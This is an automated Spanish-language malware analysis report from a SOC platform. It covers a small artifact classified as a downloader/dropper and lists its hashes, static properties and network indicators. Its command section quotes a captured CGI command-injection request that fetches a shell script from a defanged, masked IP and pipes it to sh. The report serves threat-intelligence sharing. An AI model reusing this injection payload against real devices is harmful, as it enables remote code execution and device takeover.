# 🧬 Payload Analysis

`dbd860275ac4fcba1ea75334e568d46cf3de4b5694a89dace13f388ba3525bce`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `dbd860275ac4fcba1ea75334e568d46cf3de4b5694a89dace13f388ba3525bce`
- **MD5:** `2d5a9e0e954018eaa865b14fc6cad05b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 253 B |
| Entropía | 5.08 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /cgi-bin/downloadFlile.cgi?name=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s toto5;busybox wget hxxp://91[.]92[.]
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| hash | dbd860275ac4fcba1ea75334e568d46cf3de4b5694a89dace13f388ba3525bce | static_analysis |
| command | GET /cgi-bin/downloadFlile.cgi?name=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s toto5;busybox wget hxxp://91[.]92[.] | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
